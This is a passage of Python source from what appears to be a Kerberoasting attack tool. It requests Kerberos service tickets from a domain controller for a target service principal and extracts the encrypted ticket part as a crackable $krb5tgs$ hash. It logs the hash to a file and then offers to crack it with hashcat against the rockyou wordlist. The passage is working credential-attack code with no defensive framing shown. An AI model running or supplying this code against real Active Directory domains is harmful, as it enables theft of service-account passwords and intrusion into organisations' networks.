            client_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                client_principal,
                str(current_password),
                str(self.domain),
                "",
                "",
                kdcHost=str(self.dc_ip),
            )

            tgs, cipher, old_session_key, session_key = getKerberosTGS(
                target_principal,
                str(self.domain),
                str(self.dc_ip),
                tgt,
                cipher,
                session_key,
            )

            etype = 23
            blob = None

            if isinstance(tgs, (bytes, bytearray)):
                decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                etype = int(decoded_tgs["ticket"]["enc-part"]["etype"])
                blob = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()
            else:
                etype = int(tgs["ticket"]["enc-part"]["etype"])
                cipher_field = tgs["ticket"]["enc-part"]["cipher"]
                blob = cipher_field.asOctets() if hasattr(cipher_field, "asOctets") else bytes(cipher_field)

            if etype == 23 and len(blob) >= 16:
                checksum = binascii.hexlify(blob[:16]).decode()
                encrypted = binascii.hexlify(blob[16:]).decode()
                real_hash = f"$krb5tgs$23$*{target_user_name}${self.domain}${spn}*${checksum}${encrypted}"
            else:
                real_hash = f"$krb5tgs${etype}$*{target_user_name}*{self.domain}*{spn}*{binascii.hexlify(blob).decode()}"

            print(f"  [+] HASH EXTRACTED: {real_hash[:60]}...")
            return real_hash

        except Exception as e:
            print(f"  [!] KERBEROAST FAILED: {str(e)}")
            return False

    def persist_hash_and_maybe_crack(self, hash_value, target_user_name, spn_value):
        """Optionally persist the hash to a .kirbi file and run hashcat."""
        if not hash_value:
            return False

        # Keep the existing text log for tracking.
        text_log = Path.cwd() / "data" / "extracted_hashes.txt"
        text_log.parent.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.utcnow().isoformat(timespec="seconds") + "Z"
        with text_log.open("a", encoding="utf-8") as fh:
            fh.write(f"{timestamp} | target={target_user_name} | spn={spn_value} | {hash_value}\n")

        answer = input("Attempt to crack extracted hash with hashcat? [y/N]: ").strip().lower()
        if answer not in {"y", "yes"}:
            logging.info("Hash cracking skipped by user.")
            return True

        safe_name = re.sub(r"[^A-Za-z0-9._-]+", "_", str(target_user_name).split("@")[0].lower())
        kirbi_path = Path.cwd() / "data" / f"{safe_name}.kirbi"
        kirbi_path.write_text(f"{hash_value}\n", encoding="utf-8")
        logging.info(f"Saved hash to {kirbi_path}")

        hashcat_cmd = ["hashcat", "-m", "13100", str(kirbi_path), "/usr/share/wordlists/rockyou.txt"]
        logging.info("Running: %s", " ".join(hashcat_cmd))

        try:
            completed = subprocess.run(hashcat_cmd, check=False)
            if completed.returncode != 0:
                logging.warning(f"hashcat exited with code {completed.returncode}")
        except FileNotFoundError:
            logging.error("hashcat not found in PATH.")
        except Exception as exc:
            logging.error(f"hashcat execution failed: {exc}")

        return True
